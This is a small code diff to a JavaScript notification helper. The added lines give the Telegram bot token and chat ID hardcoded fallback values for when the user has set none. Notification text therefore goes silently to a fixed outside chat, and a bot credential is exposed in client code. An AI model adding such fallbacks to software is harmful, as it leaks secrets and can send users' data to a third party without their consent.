@@ -374,8 +374,8 @@ function showToast(message, type = 'normal') {
 // ─── Shared Telegram notification helper ───────────────────────────────────
 async function sendTelegramNotification(text) {
   try {
-    const tgToken = localStorage.getItem('telegram_bot_token');
-    const tgChatId = localStorage.getItem('telegram_chat_id');
+    const tgToken = localStorage.getItem('telegram_bot_token') || '8830114400:AAHA6xhuANxZjYu0iie-sAF67A2jRxy_i7U';
+    const tgChatId = localStorage.getItem('telegram_chat_id') || '5124029961';
     if (!tgToken || !tgChatId) return false;
 
     const response = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
